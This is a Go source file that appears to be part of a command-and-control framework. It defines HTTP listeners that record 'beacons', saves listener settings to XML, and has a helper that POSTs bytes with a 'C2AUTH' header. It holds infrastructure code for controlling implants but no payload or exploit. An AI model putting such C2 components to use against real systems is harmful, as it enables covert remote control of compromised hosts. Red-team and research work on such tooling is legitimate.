package main

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"net/http"
	"strings"
)

func StartListener(uri string, port uint16, lisname string, a []byte) {

	if checkXMLExists("./Listener/", lisname+".xml") {
		var listener Listener

		ReadXML("./Listener/"+lisname+".xml", &listener)

		http.HandleFunc("/"+strings.TrimPrefix(listener.Uri, "IGOR-"), func(w http.ResponseWriter, r *http.Request) {
			Listener_Handler(w, r, &listener)
		})

		fmt.Printf("Listening on port %d: %s...\n", port, listener.Lisname)
		if err := http.ListenAndServe(fmt.Sprintf(":%d", listener.Port), nil); err != nil {
			fmt.Printf("Error starting server: %s\n", err)
		}
	} else {
		var beacons []Beacon

		listener := Listener{
			Lisname: lisname,
			Uri:     "IGOR-" + uri,
			Port:    port,
			A:       a,
			Beacons: beacons,
		}

		saveXML("./Listener/"+lisname, &listener)

		http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
			Listener_Handler(w, r, &listener)
		})

		fmt.Printf("Listening on port %d...\n", port)
		if err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil); err != nil {
			fmt.Printf("Error starting server: %s\n", err)
		}
	}

}

func Send_Bytes_to(w http.ResponseWriter, data []byte, url string, expectedHeaders map[string]string) {
	req, err := http.NewRequest("POST", url, bytes.NewReader(data))
	if err != nil {
		http.Error(w, "Error creating request", http.StatusInternalServerError)
		return
	}
	for key, value := range expectedHeaders {
		req.Header.Set(key, value)
	}
	req.Header.Set("Iamfrom", "C2AUTH")
	client := &http.Client{}
	client.Do(req)
}

func convertToUint8(input string) []uint8 {
	var result []uint8

	bytes := []byte(input)

	if len(bytes) > 16 {
		bytes = bytes[:16]
	}

	for i := 0; i < 16; i++ {
		if i < len(bytes) {
			result = append(result, uint8(bytes[i]))
		} else {
			randomByte := make([]byte, 1)
			rand.Read(randomByte)
			result = append(result, uint8(randomByte[0]))
		}
	}

	return result
}
